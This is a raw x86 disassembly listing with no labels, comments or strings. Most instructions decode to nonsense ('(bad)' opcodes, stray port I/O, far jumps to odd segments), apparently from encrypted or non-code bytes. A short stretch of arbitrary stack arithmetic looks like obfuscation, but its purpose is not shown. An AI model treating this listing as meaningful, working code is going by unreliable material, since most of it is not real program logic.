  41aca8:	mov    dl,0x5f
  41acaa:	sbb    esp,DWORD PTR [ebx-0x685e689a]
  41acb0:	mov    ebp,0xf4194ba2
  41acb5:	inc    ebp
  41acb6:	jnp    0x41ac6a
  41acb8:	cmp    al,BYTE PTR [edi+eax*2]
  41acbb:	fwait
  41acbc:	mov    bl,0x2c
  41acbe:	ins    DWORD PTR es:[edi],dx
  41acbf:	pushf  
  41acc0:	dec    ah
  41acc2:	jp     0x41ad04
  41acc4:	arpl   WORD PTR [ecx+0x74],ax
  41acc7:	mov    dl,0xec
  41acc9:	pop    ss
  41acca:	jmp    0x2a18:0xacba9d6f
  41acd1:	jo     0x41ad3f
  41acd3:	inc    edx
  41acd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acd5:	jne    0x41accf
  41acd7:	sahf   
  41acd8:	test   eax,0x9a6ef148
  41acdd:	and    eax,0xf8db8724
  41ace2:	jecxz  0x41acf0
  41ace4:	pop    esp
  41ace5:	mov    esp,0x3489496a
  41acea:	push   cs
  41aceb:	mov    edx,0xd0c2f513
  41acf0:	jmp    0x194f:0xa073e138
  41acf7:	adc    al,0x2e
  41acf9:	scas   al,BYTE PTR es:[edi]
  41acfa:	repnz xor BYTE PTR [esi+0xb286bf8],bl
  41ad01:	sub    al,0xa1
  41ad03:	sar    DWORD PTR [edx+0x48],0xa2
  41ad07:	mov    dl,0xcd
  41ad09:	jp     0x41acc9
  41ad0b:	xchg   esi,eax
  41ad0c:	mov    ds:0xd3afa148,eax
  41ad11:	xchg   ecx,eax
  41ad12:	sti    
  41ad13:	cdq    
  41ad14:	sbb    dl,BYTE PTR [ebp-0x7a]
  41ad17:	inc    esp
  41ad18:	(bad)  [ebx-0x1e]
  41ad1b:	pop    ecx
  41ad1c:	out    dx,eax
  41ad1d:	cmp    eax,0x4f6f1b82
  41ad22:	nop
  41ad23:	mov    al,ds:0xfdb2041
  41ad28:	lea    esp,[edx+0x72738fae]
  41ad2e:	fcomp  DWORD PTR [ecx]
  41ad30:	ret    
  41ad31:	addr16 and eax,0xac82d8b8
  41ad37:	adc    bh,BYTE PTR [esi-0x71]
  41ad3a:	mov    bl,0x8
  41ad3c:	fadd   DWORD PTR [ebp+0x693672a5]
  41ad42:	dec    ecx
  41ad43:	sbb    eax,0x642de28b
  41ad48:	cld    
  41ad49:	cmp    al,0x29
  41ad4b:	sub    eax,0xad578558
  41ad50:	icebp  
  41ad51:	sub    esp,DWORD PTR [edi-0xe]
  41ad54:	xor    BYTE PTR [edi],cl
  41ad56:	addr16 dec ecx
  41ad58:	int3   
  41ad59:	into   
  41ad5a:	in     eax,0xa5
  41ad5c:	in     eax,0x53
  41ad5e:	imul   ebp,esp,0x25
  41ad61:	xor    al,0xd4
  41ad63:	dec    esp
  41ad64:	jmp    0x41ad4c
  41ad66:	sar    DWORD PTR [ebp-0x2a],0xc8
  41ad6a:	jmp    0x57d37d02
  41ad6f:	xchg   edi,eax
  41ad70:	shl    DWORD PTR [edx-0x5bdacb23],0xc7
  41ad77:	pop    ebx
  41ad78:	inc    ebx
  41ad79:	adc    cl,al
  41ad7b:	icebp  
  41ad7c:	cli    
  41ad7d:	fiadd  WORD PTR [edi-0x39]
  41ad80:	or     al,0xd3
  41ad82:	sahf   
  41ad83:	add    BYTE PTR [edi],bl
  41ad85:	jp     0x41ada8
  41ad87:	arpl   WORD PTR [ecx-0x1e],ax
  41ad8a:	js     0x41adb4
  41ad8c:	mov    eax,ds:0x1bcaf7fd
  41ad91:	call   0x42c8:0x310fac5
  41ad98:	test   BYTE PTR [eax-0x76],ch
  41ad9b:	mov    ecx,0x602be151
  41ada0:	mov    al,ds:0x47435281
  41ada5:	popf   
  41ada6:	stos   BYTE PTR es:[edi],al
  41ada7:	mov    gs,WORD PTR [ecx-0x149bcc4f]
  41adad:	and    ebx,DWORD PTR [esi+0x5f8df9b0]
  41adb3:	leave  
  41adb4:	and    BYTE PTR [ebx],bh
  41adb6:	pop    es
  41adb7:	pushf  
  41adb8:	icebp  
  41adb9:	add    al,0x95
  41adbb:	sub    eax,ebp
  41adbd:	stos   BYTE PTR es:[edi],al
  41adbe:	mov    ecx,0x1239c88d
  41adc3:	pop    esi
  41adc4:	xor    ecx,edi
  41adc6:	or     ebp,DWORD PTR [esi+ecx*8]
  41adc9:	stc    
  41adca:	out    0x53,eax
  41adcc:	ss pop ebp
  41adce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adcf:	dec    edx
  41add0:	jp     0x41ae0e
  41add2:	shl    ebx,cl
  41add4:	lods   eax,DWORD PTR ds:[esi]
  41add5:	add    bh,bl
  41add7:	jns    0x41ae11
  41add9:	mov    bh,0x39
  41addb:	imul   edx,DWORD PTR [esi+edx*4-0x57],0x7949d919
  41ade3:	scas   eax,DWORD PTR es:[edi]
  41ade4:	je     0x41ae42
  41ade6:	into   
  41ade7:	or     esi,ecx
  41ade9:	jns    0x41ae40
  41adeb:	shr    dh,1
  41aded:	add    al,0xcb
  41adef:	mov    cl,0x73
  41adf1:	inc    eax
  41adf2:	push   ecx
  41adf3:	cmovs  edx,eax
  41adf6:	nop
  41adf7:	les    ebp,FWORD PTR [edx+eax*1+0x58]
  41adfb:	adc    DWORD PTR [ecx+0x6e7131bd],esp
  41ae01:	in     al,dx
  41ae02:	xor    ebx,DWORD PTR [edx+0x11678a4e]
  41ae08:	ja     0x41addf
  41ae0a:	and    DWORD PTR [ebx+0x5fc0e0bb],eax
  41ae10:	and    dl,BYTE PTR [edi-0x2]
  41ae13:	lahf   
  41ae14:	arpl   WORD PTR [ebx+ecx*2],si
  41ae17:	push   ebp
  41ae18:	sub    edi,DWORD PTR [edi]
  41ae1a:	inc    ebx
  41ae1b:	stos   BYTE PTR es:[edi],al
  41ae1c:	repz sub BYTE PTR [eax+0x3d],cl
  41ae20:	mov    eax,0xbab3ce36
  41ae25:	lds    esi,FWORD PTR [edx+0x69]
  41ae28:	xor    ch,BYTE PTR [eax+ebx*2-0x4f]
  41ae2c:	or     DWORD PTR [eax+0x7e],ebp
  41ae2f:	adc    eax,edi
  41ae31:	sub    ebx,DWORD PTR [esi]
  41ae33:	mov    ch,0x54
  41ae35:	repz fucomi st,st(4)
  41ae38:	(bad)  [ecx+0x558b0855]
  41ae3e:	or     BYTE PTR [ebx-0x3d7e57a3],cl
  41ae44:	clc    
  41ae45:	or     BYTE PTR [edi+0x0],dl
  41ae48:	imul   edx,ebx
  41ae4b:	mov    DWORD PTR [ebp-0x58],edx
  41ae4e:	mov    edx,DWORD PTR [ebp+0x8]
  41ae51:	mov    ebx,DWORD PTR [ebp-0x54]
  41ae54:	add    edx,0x64f8da
  41ae5a:	or     edx,ebx
  41ae5c:	mov    DWORD PTR [ebp-0x54],edx
  41ae5f:	mov    edx,DWORD PTR [ebp+0x8]
  41ae62:	mov    ebx,DWORD PTR [ebp-0x50]
  41ae65:	add    edx,ecx
  41ae67:	xor    edx,ebx
  41ae69:	mov    DWORD PTR [ebp-0x50],edx
  41ae6c:	mov    edx,DWORD PTR [ebp+0x8]
  41ae6f:	mov    ebx,DWORD PTR [ebp-0x4c]
  41ae72:	add    edx,edi
  41ae74:	and    edx,ebx
  41ae76:	mov    DWORD PTR [ebp-0x4c],edx
  41ae79:	mov    edx,DWORD PTR [ebp+0x8]
  41ae7c:	mov    ebx,DWORD PTR [ebp-0x48]
  41ae7f:	lea    edx,[ebx+edx*1+0x241fc1f]
  41ae86:	mov    DWORD PTR [ebp-0x48],edx
  41ae89:	mov    edx,DWORD PTR [ebp+0x8]
  41ae8c:	mov    ebx,0xfa5e15e2
  41ae91:	sub    ebx,edx
  41ae93:	add    ebx,DWORD PTR [ebp-0x44]
  41ae96:	mov    DWORD PTR [ebp-0x44],ebx
  41ae99:	mov    edx,DWORD PTR [ebp+0x8]
  41ae9c:	xor    edx,eax
  41ae9e:	add    edx,esi
  41aea0:	jne    0x418aa0
  41aea6:	mov    edx,DWORD PTR [ebp-0x10]
  41aea9:	mov    DWORD PTR [ebp+0x8],edx
  41aeac:	jmp    0x41f633
  41aeb1:	mov    edx,DWORD PTR [ebp+0x8]
  41aeb4:	mov    ebx,DWORD PTR [ebp-0x8]
  41aeb7:	xor    edx,eax
  41aeb9:	xor    ebx,eax
  41aebb:	sub    edx,ebx
  41aebd:	sub    edx,esi
  41aebf:	xor    edx,eax
  41aec1:	mov    DWORD PTR [ebp+0x8],edx
  41aec4:	mov    edx,DWORD PTR [ebp+0x8]
  41aec7:	mov    ebx,DWORD PTR [ebp-0x58]
  41aeca:	add    edx,0x5708f8
  41aed0:	imul   edx,ebx
  41aed3:	mov    DWORD PTR [ebp-0x58],edx
  41aed6:	mov    edx,DWORD PTR [ebp+0x8]
  41aed9:	mov    ebx,DWORD PTR [ebp-0x54]
  41aedc:	add    edx,0x64f8da
  41aee2:	or     edx,ebx
  41aee4:	mov    DWORD PTR [ebp-0x54],edx
  41aee7:	mov    edx,DWORD PTR [ebp+0x8]
  41aeea:	jmp    0x41d273
  41aeef:	out    0x8c,al
  41aef1:	dec    eax
  41aef2:	mov    ch,0xf0
  41aef4:	jne    0x41aee1
  41aef6:	jae    0x41aebf
  41aef8:	or     al,0x4b
  41aefa:	cdq    
  41aefb:	dec    edx
  41aefc:	dec    esi
  41aefd:	ss leave 
  41aeff:	imul   ebx,DWORD PTR [eax],0x5f067a79
  41af05:	jp     0x41af81
  41af07:	dec    eax
  41af08:	popa   
  41af09:	push   0x916403df
  41af0e:	cli    
  41af0f:	mov    edx,esp
  41af11:	mov    esi,0xaeba10f4
  41af16:	jnp    0x41aeab
  41af18:	out    0x28,al
  41af1a:	push   0xa6c9acee
  41af1f:	cmp    DWORD PTR [ebx+0x4],ebp
  41af22:	rol    BYTE PTR [edi],cl
  41af24:	test   eax,0xc76d903c
  41af29:	out    0x3d,al
  41af2b:	add    DWORD PTR [ebx+0x72f19a03],ebx
  41af31:	shr    DWORD PTR [edi-0xd729cf0],0xfa
  41af38:	add    al,0x6b
  41af3a:	sbb    al,0xd5
  41af3c:	(bad)  [eax-0x2ad1c32c]
  41af42:	aaa    
  41af43:	or     ah,ch
  41af45:	inc    ecx
  41af46:	xor    eax,0x63160872
  41af4b:	push   eax
  41af4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af4d:	xchg   DWORD PTR [esi+0x65],edi
  41af50:	pop    esi
  41af51:	push   ebx
  41af52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af53:	(bad)  
  41af55:	cwde   
  41af56:	js     0x41af4e
  41af58:	pop    es
  41af59:	mov    gs,WORD PTR [eax]
  41af5b:	lea    esi,[eax]
  41af5d:	mov    DWORD PTR [edi-0x1b],ecx
  41af60:	and    DWORD PTR [edi],0x5bb6302c
  41af66:	sub    al,BYTE PTR [eax+ebp*4+0x6d6e2fc3]
  41af6d:	push   es
  41af6e:	(bad)  
  41af6f:	push   ebx
  41af70:	mov    WORD PTR [esi],fs
  41af72:	rcr    DWORD PTR [eax-0x51],1
  41af75:	loope  0x41af15
  41af77:	adc    al,0x92
  41af79:	ret    0x353a
  41af7c:	stos   BYTE PTR es:[edi],al
  41af7d:	outs   dx,DWORD PTR ds:[esi]
  41af7e:	pop    eax
  41af7f:	pop    ds
  41af80:	xchg   DWORD PTR [ebp-0xa266639],esi
  41af86:	jecxz  0x41af3b
  41af88:	mov    dl,BYTE PTR [esi]
  41af8a:	mov    ebx,0x5f038a8
  41af8f:	inc    ebx
  41af90:	xor    DWORD PTR [edx],esp
  41af92:	cmp    BYTE PTR [esi+0x74ae2ff8],0x67
  41af99:	xor    BYTE PTR [esp+ecx*2-0x4672b21c],cl
  41afa0:	lock mov bh,bh
  41afa3:	jo     0x41afad
  41afa5:	dec    eax
  41afa6:	push   ss
  41afa7:	xor    al,0xf6
  41afaa:	scas   al,BYTE PTR es:[edi]
  41afab:	mov    WORD PTR [ebx+0x22649eb7],ss
  41afb1:	sub    DWORD PTR [ebp-0x42],edi
  41afb4:	or     BYTE PTR [eax],bl
  41afb6:	stos   BYTE PTR es:[edi],al
  41afb7:	jmp    0xeeb7b231
  41afbc:	icebp  
  41afbd:	jb     0x41b03a
  41afbf:	sub    DWORD PTR [ecx+0x29a1cb3c],ebx
  41afc5:	xchg   esi,eax
  41afc6:	and    BYTE PTR [bx+di],cl
  41afc9:	cld    
  41afca:	inc    ebp
  41afcb:	cs loopne 0x41af6a
  41afce:	(bad)
  41afd2:	pop    esp
  41afd3:	pop    ebx
  41afd4:	ds push ss
  41afd6:	fcom   QWORD PTR [esi+0x3b15990b]
  41afdc:	mov    bh,bh
  41afde:	mov    DWORD PTR fs:[ecx+0x682c582a],eax
  41afe5:	aas    
  41afe6:	mov    ds:0xff644e7b,eax
  41afeb:	inc    ebp
  41afec:	sub    bh,BYTE PTR [eax]
  41afee:	gs mov edi,0xa4c4fdb8
  41aff4:	or     BYTE PTR [esi-0x76],bh
  41aff7:	and    eax,0x4d1c0004
  41affc:	aad    0xaf
  41affe:	repz xor al,0xdc
  41b001:	xor    BYTE PTR [ebx+0x8361e1],cl
  41b007:	jl     0x41b054
  41b009:	xor    al,0xe0
  41b00b:	inc    ebp
  41b00c:	xor    BYTE PTR [ebx-0x6dc6c27f],dh
  41b012:	aad    0x33
  41b014:	lds    esi,FWORD PTR [ecx-0x3]
  41b017:	loopne 0x41b02f
  41b019:	adc    DWORD PTR [ecx+0x71],0x79b81bb1
  41b020:	xchg   edi,eax
  41b021:	adc    DWORD PTR [edx],eax
  41b023:	lods   al,BYTE PTR ds:[esi]
  41b024:	sub    BYTE PTR ds:0x5d18b5cd,dl
  41b02a:	sahf   
  41b02b:	retf   
  41b02c:	fisub  WORD PTR [ebx-0x2c44b7dd]
  41b032:	out    0xa3,eax
  41b034:	bnd jno 0x41b063
  41b037:	sbb    BYTE PTR [ecx-0x56],ch
  41b03a:	stos   DWORD PTR es:[edi],eax
  41b03b:	setno  dl
  41b03e:	das    
  41b03f:	adc    edx,0xffffffa2
  41b042:	xchg   DWORD PTR [edi+ebx*8+0x682e6e8a],ebx
  41b049:	mov    BYTE PTR [ebp+0x1865ff7f],dl
  41b04f:	in     eax,dx
  41b050:	xchg   ebx,eax
  41b051:	sbb    DWORD PTR [edx-0x7a],ebp
  41b054:	shr    BYTE PTR [ebx-0x6d1cae76],cl
  41b05a:	loopne 0x41b080
  41b05c:	jo     0x41b056
  41b05e:	adc    eax,0x1f5c7d14
  41b063:	lds    edx,FWORD PTR [edi+0x4bba075a]
  41b069:	adc    ah,ah
  41b06b:	fimul  WORD PTR [edx]
  41b06d:	add    ch,BYTE PTR [ebx]
  41b06f:	inc    edx
  41b070:	inc    eax
  41b071:	rcr    BYTE PTR [eax+0x6e88bb01],cl
  41b077:	mov    dl,0x74
  41b079:	sar    BYTE PTR [edx+0x1ce11137],1
  41b07f:	jo     0x41b085
  41b081:	dec    eax
  41b082:	inc    edx
  41b083:	iret   
  41b084:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b085:	das    
  41b086:	xchg   DWORD PTR [edx-0x56d416c1],eax
  41b08c:	mov    ah,0xaf
  41b08e:	iret   
  41b08f:	sbb    eax,0xb4a0bac9
  41b094:	cmp    eax,0xc63554c9
  41b099:	adc    dh,0xac
  41b09c:	les    ebx,FWORD PTR [edi+0x63f36cf7]
  41b0a2:	mov    ecx,0xf7eb9169
  41b0a7:	pushf  
  41b0a8:	pop    esp
  41b0a9:	xchg   ebp,eax
  41b0aa:	sub    BYTE PTR [eax],dh
  41b0ac:	ror    DWORD PTR [edi+0x76],cl
  41b0af:	adc    esi,0x599e0888
  41b0b5:	dec    edx
  41b0b6:	cdq    
  41b0b7:	repnz lahf 
  41b0b9:	inc    eax
  41b0ba:	rol    DWORD PTR [eax+ebp*2+0x1574d3a5],0xa4
  41b0c2:	add    DWORD PTR [ebp-0x1f2c956],eax
  41b0c8:	push   edx
  41b0c9:	leave  
  41b0ca:	push   0x15
  41b0cc:	repz add cl,BYTE PTR ds:[eax-0x2d]
  41b0d1:	or     BYTE PTR [ecx],ch
  41b0d3:	stos   BYTE PTR es:[edi],al
  41b0d4:	ins    DWORD PTR es:[edi],dx
  41b0d5:	push   es
  41b0d6:	xchg   edx,eax
  41b0d7:	push   ecx
  41b0d8:	xlat   BYTE PTR ds:[ebx]
  41b0d9:	mov    al,0xd7
  41b0db:	lea    ecx,[edi]
  41b0dd:	push   0x78
  41b0df:	xchg   esi,eax
  41b0e0:	dec    edx
  41b0e1:	popa   
  41b0e2:	scas   al,BYTE PTR es:[edi]
  41b0e3:	ins    DWORD PTR es:[edi],dx
  41b0e4:	jp     0x41b0e2
  41b0e6:	in     eax,dx
  41b0e7:	pushf  
  41b0e8:	ror    BYTE PTR [eax-0x352d5473],cl
  41b0ee:	ja     0x41b0ce
  41b0f0:	sub    bh,BYTE PTR [ebx+0x2e]
  41b0f3:	fcmovbe st,st(1)
  41b0f5:	push   esi
  41b0f6:	pop    ecx
  41b0f7:	stmxcsr DWORD PTR [ecx+0x4ec198fe]
  41b0fe:	cmp    ah,bl
  41b100:	pop    ebx
  41b101:	bound  esp,QWORD PTR [edx-0x65]
  41b104:	jl     0x41b08c
  41b106:	int    0x41
  41b108:	mov    WORD PTR [ebx],?
  41b10a:	jecxz  0x41b156
  41b10c:	in     eax,0x19
  41b10e:	dec    ecx
  41b10f:	xchg   edx,eax
  41b110:	je     0x41b0b1
  41b112:	lahf   
  41b113:	test   al,0x52
  41b115:	inc    esi
  41b116:	cld    
  41b117:	repnz cmp eax,0xfd4abc3b
  41b11d:	inc    ebx
  41b11e:	inc    ecx
  41b11f:	fsub   DWORD PTR [ebx-0x1293abf7]
  41b125:	loope  0x41b0af
  41b127:	cli    
  41b128:	xchg   esp,eax
  41b129:	xchg   ebp,eax
  41b12a:	enter  0x14c8,0x71
  41b12e:	or     dh,dl
  41b130:	scas   eax,DWORD PTR es:[edi]
  41b131:	fs pop ebx
  41b133:	int    0xe9
  41b135:	retf   0x7442
  41b138:	inc    ecx
  41b139:	mov    eax,0x6787bfc6
  41b13e:	mov    al,ds:0x873ec335
  41b143:	fadd   DWORD PTR [ebp+0x47b4e606]
  41b149:	fdiv   st(5),st
  41b14b:	sub    al,0xaa
  41b14d:	fisub  WORD PTR [ebp-0xf1895ce]
  41b153:	sbb    esp,DWORD PTR [esi-0x514d8a0]
  41b159:	lock xchg esp,eax
  41b15b:	outs   dx,DWORD PTR ds:[esi]
  41b15c:	mov    esi,esi
  41b15e:	or     DWORD PTR [ebp-0x77],esp
  41b161:	push   ecx
  41b162:	dec    ebp
  41b163:	ds or  dl,bh
  41b166:	(bad)
  41b169:	add    ah,BYTE PTR [ebx+0x10f728e1]
  41b16f:	stc    
  41b170:	dec    eax
  41b171:	fisubr WORD PTR [ecx+0x6c0fae5]
  41b177:	dec    ecx
  41b178:	repz push eax
  41b17a:	out    dx,al
  41b17b:	shl    BYTE PTR [ebx+0x3bab9699],cl
  41b181:	add    al,0x1f
  41b183:	out    dx,eax
  41b184:	add    eax,0xeb3b1c04
  41b189:	add    ebx,edi
  41b18b:	jo     0x41b152
  41b18d:	inc    edi
  41b18e:	(bad)  
  41b190:	pop    edi
  41b191:	lds    eax,FWORD PTR [eax+eax*4]
  41b194:	mov    ebx,0xdc36207b
  41b199:	push   ss
  41b19a:	lock dec eax
  41b19c:	(bad)  
  41b19e:	ja     0x41b1e7
  41b1a0:	mov    ch,0x8b
  41b1a2:	xor    eax,DWORD PTR [eax]
  41b1a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1a5:	pusha  
  41b1a6:	adc    esp,DWORD PTR [edi]
  41b1a8:	enter  0x6fcc,0x1e
  41b1ac:	or     eax,0x331d832
  41b1b1:	in     eax,0x5a
  41b1b3:	jle    0x41b202
  41b1b5:	xlat   BYTE PTR ds:[ebx]
  41b1b6:	cli    
  41b1b7:	mov    dh,0x5d
  41b1b9:	xor    ch,BYTE PTR [ebx+0x7b]
  41b1bc:	loopne 0x41b1fd
  41b1be:	adc    DWORD PTR [edi-0x5b518554],ecx
  41b1c4:	es jb  0x41b237
  41b1c7:	jl     0x41b149
  41b1c9:	mov    cs,WORD PTR [ebx-0x47]
  41b1cc:	retf   0xcd6c
  41b1cf:	or     eax,0x80e26fa5
  41b1d4:	dec    ebp
  41b1d5:	sar    BYTE PTR ds:[eax-0x3c32e67c],cl
  41b1dc:	pop    es
  41b1dd:	pop    es
  41b1de:	scas   eax,DWORD PTR es:[edi]
  41b1df:	sbb    BYTE PTR [edi+eax*2],bl
  41b1e2:	(bad)  
  41b1e3:	and    ecx,ebx
  41b1e5:	mov    edx,DWORD PTR [eax+ecx*2-0x188acc06]
  41b1ec:	xchg   esi,eax
  41b1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1ee:	mov    esp,0x681a04c3
  41b1f3:	mov    cl,0x6
  41b1f5:	test   DWORD PTR [edi+ebp*8+0x37363616],esi
  41b1fc:	les    ebp,FWORD PTR [esi-0x86b589c]
  41b202:	in     eax,dx
  41b203:	and    al,0xa1
  41b205:	mov    ds:0x29a752e0,al
  41b20a:	push   bx
  41b20c:	dec    ebx
  41b20d:	jo     0x41b23c
  41b20f:	retf   0xf47f
  41b212:	retf   0x2706
  41b215:	pusha  
  41b216:	inc    edx
  41b217:	clc    
  41b218:	cs call 0xec1f0b66
  41b21e:	jmp    0x854:0x6c5ebf6b
  41b225:	mov    eax,0xabf3d111
  41b22a:	aaa    
  41b22b:	xor    bh,bh
  41b22d:	fild   QWORD PTR [ebx+0x42]
  41b230:	iret   
  41b231:	sahf   
  41b232:	ja     0x41b2b0
  41b234:	pop    ebx
  41b235:	jb     0x41b2af
  41b237:	add    eax,0x85972d11
  41b23c:	mov    WORD PTR [eax+0x5b66a000],es
  41b242:	outs   dx,DWORD PTR ds:[esi]
  41b243:	xor    eax,0x6b8ed10c
  41b248:	push   ecx
  41b249:	xor    cl,BYTE PTR ds:0xc969d26c
  41b24f:	test   BYTE PTR [esi+0x1f],cl
  41b252:	cdq    
  41b253:	xor    BYTE PTR [eax-0x3367cd1d],0xe9
  41b25a:	sub    edx,DWORD PTR [eax+0x7e8ae6f2]
  41b260:	ins    BYTE PTR es:[edi],dx
  41b261:	mov    ecx,0xc5a40328
  41b266:	data16 sbb BYTE PTR [eax],al
  41b269:	and    al,BYTE PTR [ecx-0x7b]
  41b26c:	cmp    al,0x2a
  41b26e:	scas   eax,DWORD PTR es:[edi]
  41b26f:	and    ebp,esi
  41b271:	daa    
  41b272:	mov    ebp,0xe7425d7d
  41b277:	inc    ebx
  41b278:	gs push ebx
  41b27a:	adc    ebp,0x35
  41b27d:	data16 (bad) 
  41b27f:	in     eax,0xee
  41b281:	data16 aas 
  41b283:	mov    ah,0xd6
  41b285:	mov    eax,ds:0x72ae8806
  41b28a:	push   ds
  41b28b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b28c:	inc    edi
  41b28d:	jle    0x41b2cc
  41b28f:	mov    esi,0x25003bb4
  41b294:	cmp    DWORD PTR [eax],0x7b
  41b297:	mov    dh,al
  41b299:	test   eax,0x275e22a3
  41b29e:	es ins BYTE PTR es:[edi],dx
  41b2a0:	aad    0x16
  41b2a2:	clc    
  41b2a3:	inc    edx
  41b2a4:	das    
  41b2a5:	xor    al,0x9e
  41b2a7:	js     0x41b2f9
  41b2a9:	mov    al,0x9
  41b2ab:	jmp    0x6804:0xf5806814
  41b2b2:	ret    
  41b2b3:	fistp  WORD PTR [ecx+esi*4-0x27daa2a8]
  41b2ba:	dec    edi
  41b2bb:	add    ebp,DWORD PTR [edx]
  41b2bd:	or     ebp,DWORD PTR [edi+eiz*8-0x5330433d]
  41b2c4:	mov    bl,0x91
  41b2c6:	sub    DWORD PTR [edi-0x10],ebx
  41b2c9:	nop
  41b2ca:	and    esp,ebp
  41b2cc:	cmc    
  41b2cd:	sub    ebp,esi
  41b2cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2d0:	call   0x481e92e7
  41b2d5:	push   0x2afc4a70
  41b2da:	push   edi
  41b2db:	not    edi
  41b2dd:	shl    DWORD PTR [ecx+0x28eb94b1],1
  41b2e3:	icebp  
  41b2e4:	mov    ah,0x8e
  41b2e6:	mov    edx,0x88bff5bf
  41b2eb:	or     DWORD PTR [edi],ebx
  41b2ed:	xchg   DWORD PTR [edx+0x1c],esp
  41b2f0:	(bad)  
  41b2f1:	jns    0x41b363
  41b2f3:	inc    ebx
  41b2f4:	ficom  DWORD PTR [ebx+0x33c81b41]
  41b2fa:	sub    eax,0xa250e710
  41b2ff:	jg     0x41b33e
  41b301:	mov    bh,0xf4
  41b303:	gs cwde 
  41b305:	fdivrp st(7),st
  41b307:	fidivr WORD PTR [edi+eiz*2]
  41b30a:	pushf  
  41b30b:	(bad)  
  41b30c:	mov    esp,0xb157cdfc
  41b311:	or     al,0x38
  41b313:	push   es
  41b314:	sub    bl,BYTE PTR [ebp+0x24]
  41b317:	push   ds
  41b318:	fsub   DWORD PTR [ecx-0x59]
  41b31b:	mov    bh,0xf3
  41b31d:	pop    ebp
  41b31e:	and    eax,0xd0b20dd6
  41b323:	lods   al,BYTE PTR ds:[esi]
  41b324:	(bad)
  41b327:	mov    al,ds:0xc2d04147
  41b32c:	dec    esp
  41b32d:	jp     0x41b33c
  41b32f:	jb     0x41b358
  41b331:	push   edi
  41b332:	(bad)  
  41b333:	jmp    0xa3ae:0xb0ff6d16
  41b33a:	into   
  41b33b:	sbb    eax,DWORD PTR [edx-0x224feee3]
  41b341:	rcr    DWORD PTR [edx+0x44],0x8
  41b345:	out    0x41,eax
  41b347:	adc    esp,DWORD PTR [ecx]
  41b349:	xchg   ecx,eax
  41b34a:	outs   dx,DWORD PTR ds:[esi]
  41b34b:	sahf   
  41b34c:	inc    esp
  41b34d:	adc    eax,0x314dca37
  41b352:	pop    eax
  41b353:	cmp    ecx,0xffffffc3
  41b356:	popf   
  41b357:	fnstcw WORD PTR [esi+ebp*1-0x57f3a44d]
  41b35e:	cmp    DWORD PTR [eiz*8+0xce125b5],0x42c9dc6d
  41b369:	push   esi
  41b36a:	jle    0x41b351
  41b36c:	jbe    0x41b318
  41b36e:	jmp    0xc4e4:0x88c75a84
  41b375:	hlt    
  41b376:	bts    DWORD PTR [edi-0x75],ebx
  41b37a:	stos   DWORD PTR es:[edi],eax
  41b37b:	(bad)  
  41b37c:	call   0x171b201
  41b381:	pushf  
  41b382:	out    0x42,al
  41b384:	mov    ch,0xf8
  41b386:	call   0x7a0533d
  41b38b:	jbe    0x41b3d8
  41b38d:	ss add eax,0x8f4067d7
  41b393:	das    
  41b394:	pop    ebp
  41b395:	test   BYTE PTR [esi+0x3af717e7],ch
  41b39b:	out    dx,al
  41b39c:	(bad)  
  41b39d:	sub    DWORD PTR [ecx-0x25],ebp
  41b3a0:	sbb    DWORD PTR [edi+0x6],ebx
  41b3a3:	gs inc esp
  41b3a5:	cli    
  41b3a6:	push   ecx
  41b3a7:	imul   DWORD PTR [ebp-0x2e]
  41b3aa:	mov    DWORD PTR [esi+0x36],eax
  41b3ad:	sub    ebp,DWORD PTR ds:0xf96f956e
  41b3b3:	mov    ah,BYTE PTR [ecx]
  41b3b5:	(bad)  
  41b3b6:	push   ecx
  41b3b7:	jmp    0x62c3:0x1cb02f58
  41b3be:	jno    0x41b377
  41b3c0:	outs   dx,DWORD PTR ds:[esi]
  41b3c1:	sub    eax,esi
  41b3c3:	(bad)
  41b3c7:	sbb    bh,BYTE PTR [ecx]
  41b3c9:	mov    esi,0x98233b38
  41b3ce:	cmp    edx,DWORD PTR [edi+0x180b78a7]
  41b3d4:	add    eax,DWORD PTR [edi+0x502d40d9]
  41b3da:	std    
  41b3db:	add    DWORD PTR [ebp+0x7b987c3c],0x4e
  41b3e2:	mov    ah,0x42
  41b3e4:	adc    al,0x74
  41b3e6:	xor    eax,0x6003f394
  41b3eb:	mov    BYTE PTR [edi+0x3520874e],cl
  41b3f1:	std    
  41b3f2:	push   cs
  41b3f3:	into   
  41b3f4:	stos   DWORD PTR es:[edi],eax
  41b3f5:	xchg   ebp,eax
  41b3f6:	pop    esi
  41b3f7:	jp     0x41b467
  41b3f9:	adc    cl,BYTE PTR [edx-0x7396edfa]
  41b3ff:	dec    ecx
  41b400:	dec    edx
  41b401:	or     DWORD PTR [esi+0x31ffbdff],0x7f
  41b408:	dec    esi
  41b409:	mov    gs,esp
  41b40b:	push   ds
  41b40c:	inc    esi
  41b40d:	adc    bh,BYTE PTR [ebx-0x2]
  41b410:	xor    esi,DWORD PTR [edi+0x7f]
  41b413:	jnp    0x41b3e7
  41b415:	daa    
  41b416:	loope  0x41b3a8
  41b418:	mov    cl,0x12
  41b41a:	sub    al,0xfc
  41b41c:	stos   DWORD PTR es:[edi],eax
  41b41d:	cmp    DWORD PTR [esi],esp
  41b41f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b420:	or     dh,BYTE PTR [ebx+0x706d13fe]
  41b426:	out    dx,al
  41b427:	sub    al,0x5a
  41b429:	jnp    0x41b453
  41b42b:	push   0x60
  41b42d:	dec    edi
  41b42e:	pop    DWORD PTR [edi+0x4b6edc7b]
  41b434:	nop
  41b435:	bnd jl 0x41b4b2
  41b438:	inc    esp
  41b439:	pusha  
  41b43a:	or     DWORD PTR [edi],ebp
  41b43c:	sahf   
  41b43d:	mov    DWORD PTR [eax+0x50535093],edx
  41b443:	mov    ebx,0x76f94a
  41b448:	fisttp WORD PTR [eax+esi*1-0x6bde5694]
  41b44f:	inc    ecx
  41b450:	gs in  al,dx
  41b452:	div    BYTE PTR [eax-0x4ec48c2]
  41b458:	(bad)  
